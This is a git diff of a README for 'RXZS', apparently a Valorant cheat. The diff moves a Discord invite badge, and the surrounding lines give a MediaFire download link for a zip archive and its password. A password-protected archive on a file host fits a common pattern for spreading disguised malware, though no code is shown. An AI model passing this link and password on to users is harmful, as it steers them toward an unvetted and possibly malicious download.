@@ -16,8 +16,6 @@ The RXZS tool is available for download on MediaFire. Please use the link below 
 
 [![Download RXZS on MediaFire](https://img.shields.io/badge/Download-RXZS-blue?style=for-the-badge&logo=mediafire)](https://www.mediafire.com/file/s5wbm4sk7rp13us/Valorant-External-main.zip/file)
 
-[![Join Our Discord](https://img.shields.io/badge/Join%20Our%20Discord-7289DA?style=for-the-badge&logo=discord&logoColor=white)](https://discord.gg/uJqMgSfa)
-
 **Password**: `RXZS`
 
 ## Why Do We Use a Password? 🔐
@@ -55,4 +53,4 @@ We welcome contributions to improve RXZS. If you have suggestions or want to add
 ## Support 💬
 If you encounter any issues or have questions about the tool, join our discord.
 
-
+[![Join Our Discord](https://img.shields.io/badge/Join%20Our%20Discord-7289DA?style=for-the-badge&logo=discord&logoColor=white)](https://discord.gg/uJqMgSfa)
